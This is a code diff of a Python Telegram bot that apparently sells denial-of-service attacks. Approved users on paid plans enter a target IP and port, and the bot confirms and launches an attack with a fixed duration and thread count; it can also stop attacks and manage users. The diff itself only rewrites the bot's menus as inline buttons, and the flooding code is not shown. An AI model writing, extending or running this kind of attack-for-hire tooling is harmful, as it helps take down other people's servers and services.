@@ -105,22 +105,22 @@ def run_attack_command_sync(user_id, target_ip, target_port, action):
         return False
 
 def create_main_menu():
-    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
+    markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
-        KeyboardButton("🚀 Start Attack"),
-        KeyboardButton("⏹ Stop Attack"),
-        KeyboardButton("ℹ️ Help"),
-        KeyboardButton("📊 My Plan")
+        InlineKeyboardButton("🚀 Start Attack", callback_data="start_attack"),
+        InlineKeyboardButton("⏹ Stop Attack", callback_data="stop_attack"),
+        InlineKeyboardButton("ℹ️ Help", callback_data="help"),
+        InlineKeyboardButton("📊 My Plan", callback_data="my_plan")
     )
     return markup
 
 def create_admin_menu():
-    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
+    markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
-        KeyboardButton("👥 User Management"),
-        KeyboardButton("👥 Group Settings"),
-        KeyboardButton("📊 Stats"),
-        KeyboardButton("🔙 Main Menu")
+        InlineKeyboardButton("👥 User Management", callback_data="user_management"),
+        InlineKeyboardButton("👥 Group Settings", callback_data="group_settings"),
+        InlineKeyboardButton("📊 Stats", callback_data="stats"),
+        InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")
     )
     return markup
 
@@ -575,23 +575,17 @@ def handle_new_member(message):
             else:
                 send_welcome_message(message.chat.id, user.id)
 
-# Button handlers
-@bot.message_handler(func=lambda message: message.text in ["🚀 Start Attack", "/attack"])
-def attack_button_handler(message):
-    if not should_respond(message.chat.id, message.from_user.id):
-        return
-        
-    user_id = message.from_user.id
-    if not check_user_approval(user_id):
-        bot.send_message(message.chat.id, """
-🔒 *Access Restricted*
+# Callback handlers
+@bot.callback_query_handler(func=lambda call: True)
+def callback_handler(call):
+    try:
+        if call.data == "start_attack":
+            user_id = call.from_user.id
+            if not check_user_approval(user_id):
+                bot.answer_callback_query(call.id, "🔒 You don't have permission to use this feature!", show_alert=True)
+                return
 
-You don't have permission to use this feature.
-Please upgrade your plan or contact admin.
-""", parse_mode='Markdown')
-        return
-
-    bot.send_message(message.chat.id, """
+            bot.send_message(call.message.chat.id, """
 🎯 *Attack Setup*
 
 Please provide the target in this format:
@@ -600,127 +594,65 @@ Please provide the target in this format:
 Example:
 `1.1.1.1 80`
 """, parse_mode='Markdown')
-    bot.register_next_step_handler(message, process_attack_ip_port)
-
-def process_attack_ip_port(message):
-    try:
-        if not should_respond(message.chat.id, message.from_user.id):
-            return
+            bot.register_next_step_handler(call.message, process_attack_ip_port)
             
-        user_id = message.from_user.id
-        args = message.text.split()
-        
-        if len(args) != 2:
-            bot.send_message(message.chat.id, "❌ *Invalid format!* Use: `IP PORT`", parse_mode='Markdown')
-            return
-
-        target_ip, target_port = args[0], int(args[1])
-        
-        if target_port in BLOCKED_PORTS:
-            bot.send_message(message.chat.id, f"🚫 *Port {target_port} is blocked*", parse_mode='Markdown')
-            return
-
-        user_attack_details[user_id] = (target_ip, target_port)
-        
-        # Confirm attack details
-        confirm_msg = f"""
-🔍 *Attack Details Confirmation*
-
-🔹 *Target IP:* `{target_ip}`
-🔹 *Target Port:* `{target_port}`
-🔹 *Duration:* `{MAX_ATTACK_DURATION//60} minutes`
-🔹 *Threads:* `{THREADS_COUNT}`
-
-⚠️ *Are you sure you want to proceed?*
-"""
-        markup = InlineKeyboardMarkup()
-        markup.add(
-            InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_attack_{user_id}"),
-            InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")
-        )
-        bot.send_message(message.chat.id, confirm_msg, parse_mode='Markdown', reply_markup=markup)
-
-    except ValueError:
-        bot.send_message(message.chat.id, "❌ *Invalid port number!*", parse_mode='Markdown')
-    except Exception as e:
-        error_msg = f"❌ *Error:* {str(e)}"
-        bot.send_message(message.chat.id, error_msg, parse_mode='Markdown')
-        logging.error(f"Error in process_attack_ip_port: {e}")
-
-@bot.message_handler(func=lambda message: message.text == "⏹ Stop Attack")
-def stop_attack_button(message):
-    if not should_respond(message.chat.id, message.from_user.id):
-        return
-        
-    user_id = message.from_user.id
-    attack_details = user_attack_details.get(user_id)
-    
-    if not attack_details:
-        bot.send_message(message.chat.id, "❌ *No active attack found*", parse_mode='Markdown')
-        return
-    
-    target_ip, target_port = attack_details
-    if run_attack_command_sync(user_id, target_ip, target_port, 2):
-        bot.send_message(message.chat.id, f"""
-🛑 *Attack Stopped*
-
-🔹 *Target:* `{target_ip}:{target_port}`
-✅ Successfully terminated
-""", parse_mode='Markdown')
-        user_attack_details.pop(user_id, None)
-    else:
-        bot.send_message(message.chat.id, "❌ *Failed to stop attack*", parse_mode='Markdown')
-
-@bot.message_handler(func=lambda message: message.text == "ℹ️ Help")
-def help_button(message):
-    if not should_respond(message.chat.id, message.from_user.id):
-        return
-    send_help_message(message.chat.id)
-
-@bot.message_handler(func=lambda message: message.text == "📊 My Plan")
-def myplan_button(message):
-    if not should_respond(message.chat.id, message.from_user.id):
-        return
-    send_plan_info(message.chat.id, message.from_user.id)
-
-@bot.message_handler(func=lambda message: message.text == "👥 User Management" and is_user_admin(message.from_user.id))
-def user_management_button(message):
-    if not should_respond(message.chat.id, message.from_user.id):
-        return
-        
-    markup = InlineKeyboardMarkup()
-    markup.add(
-        InlineKeyboardButton("📝 Approve User", callback_data="admin_approve"),
-        InlineKeyboardButton("❌ Disapprove User", callback_data="admin_disapprove"),
-        InlineKeyboardButton("📊 List Users", callback_data="admin_list_users")
-    )
-    bot.send_message(message.chat.id, "👥 *User Management*", parse_mode='Markdown', reply_markup=markup)
-
-@bot.message_handler(func=lambda message: message.text == "👥 Group Settings" and is_user_admin(message.from_user.id))
-def group_settings_button(message):
-    if not should_respond(message.chat.id, message.from_user.id):
-        return
-        
-    bot.send_message(message.chat.id, "⚙️ *Group Settings*", 
-                    parse_mode='Markdown', reply_markup=create_group_settings_menu())
-
-@bot.message_handler(func=lambda message: message.text == "📊 Stats" and is_user_admin(message.from_user.id))
-def stats_button(message):
-    if not should_respond(message.chat.id, message.from_user.id):
-        return
-    stats_command(message)
-
-@bot.message_handler(func=lambda message: message.text == "🔙 Main Menu")
-def main_menu_button(message):
-    if not should_respond(message.chat.id, message.from_user.id):
-        return
-    send_welcome_message(message.chat.id)
-
-# Callback handlers
-@bot.callback_query_handler(func=lambda call: True)
-def callback_handler(call):
-    try:
-        if call.data.startswith("confirm_attack_"):
+        elif call.data == "stop_attack":
+            user_id = call.from_user.id
+            attack_details = user_attack_details.get(user_id)
+            
+            if not attack_details:
+                bot.answer_callback_query(call.id, "❌ No active attack found!", show_alert=True)
+                return
+            
+            target_ip, target_port = attack_details
+            if run_attack_command_sync(user_id, target_ip, target_port, 2):
+                bot.answer_callback_query(call.id, f"🛑 Attack stopped on {target_ip}:{target_port}")
+                user_attack_details.pop(user_id, None)
+            else:
+                bot.answer_callback_query(call.id, "❌ Failed to stop attack!", show_alert=True)
+                
+        elif call.data == "help":
+            send_help_message(call.message.chat.id)
+            bot.answer_callback_query(call.id)
+            
+        elif call.data == "my_plan":
+            send_plan_info(call.message.chat.id, call.from_user.id)
+            bot.answer_callback_query(call.id)
+            
+        elif call.data == "user_management":
+            if is_user_admin(call.from_user.id):
+                markup = InlineKeyboardMarkup()
+                markup.add(
+                    InlineKeyboardButton("📝 Approve User", callback_data="admin_approve"),
+                    InlineKeyboardButton("❌ Disapprove User", callback_data="admin_disapprove"),
+                    InlineKeyboardButton("📊 List Users", callback_data="admin_list_users")
+                )
+                bot.edit_message_text("👥 *User Management*", call.message.chat.id, call.message.message_id, 
+                                    parse_mode='Markdown', reply_markup=markup)
+            else:
+                bot.answer_callback_query(call.id, "❌ Access denied", show_alert=True)
+                
+        elif call.data == "group_settings":
+            if is_user_admin(call.from_user.id):
+                bot.edit_message_text("⚙️ *Group Settings*", call.message.chat.id, call.message.message_id,
+                                    parse_mode='Markdown', reply_markup=create_group_settings_menu())
+            else:
+                bot.answer_callback_query(call.id, "❌ Access denied", show_alert=True)
+                
+        elif call.data == "stats":
+            if is_user_admin(call.from_user.id):
+                stats_command(call.message)
+            else:
+                bot.answer_callback_query(call.id, "❌ Access denied", show_alert=True)
+                
+        elif call.data == "main_menu":
+            if is_user_admin(call.from_user.id):
+                bot.edit_message_text("👑 *Admin Panel*", call.message.chat.id, call.message.message_id,
+                                    parse_mode='Markdown', reply_markup=create_admin_menu())
+            else:
+                send_welcome_message(call.message.chat.id)
+                
+        elif call.data.startswith("confirm_attack_"):
             user_id = int(call.data.split("_")[2])
             if call.from_user.id != user_id:
                 bot.answer_callback_query(call.id, "❌ This is not your attack!", show_alert=True)
@@ -835,6 +767,51 @@ def callback_handler(call):
     except Exception as e:
         logging.error(f"Error in callback handler: {e}")
         bot.answer_callback_query(call.id, "❌ An error occurred", show_alert=True)
+
+def process_attack_ip_port(message):
+    try:
+        if not should_respond(message.chat.id, message.from_user.id):
+            return
+            
+        user_id = message.from_user.id
+        args = message.text.split()
+        
+        if len(args) != 2:
+            bot.send_message(message.chat.id, "❌ *Invalid format!* Use: `IP PORT`", parse_mode='Markdown')
+            return
+
+        target_ip, target_port = args[0], int(args[1])
+        
+        if target_port in BLOCKED_PORTS:
+            bot.send_message(message.chat.id, f"🚫 *Port {target_port} is blocked*", parse_mode='Markdown')
+            return
+
+        user_attack_details[user_id] = (target_ip, target_port)
+        
+        # Confirm attack details
+        confirm_msg = f"""
+🔍 *Attack Details Confirmation*
+
+🔹 *Target IP:* `{target_ip}`
+🔹 *Target Port:* `{target_port}`
+🔹 *Duration:* `{MAX_ATTACK_DURATION//60} minutes`
+🔹 *Threads:* `{THREADS_COUNT}`
+
+⚠️ *Are you sure you want to proceed?*
+"""
+        markup = InlineKeyboardMarkup()
+        markup.add(
+            InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_attack_{user_id}"),
+            InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")
+        )
+        bot.send_message(message.chat.id, confirm_msg, parse_mode='Markdown', reply_markup=markup)
+
+    except ValueError:
+        bot.send_message(message.chat.id, "❌ *Invalid port number!*", parse_mode='Markdown')
+    except Exception as e:
+        error_msg = f"❌ *Error:* {str(e)}"
+        bot.send_message(message.chat.id, error_msg, parse_mode='Markdown')
+        logging.error(f"Error in process_attack_ip_port: {e}")
 
 def process_welcome_message(message):
     try:
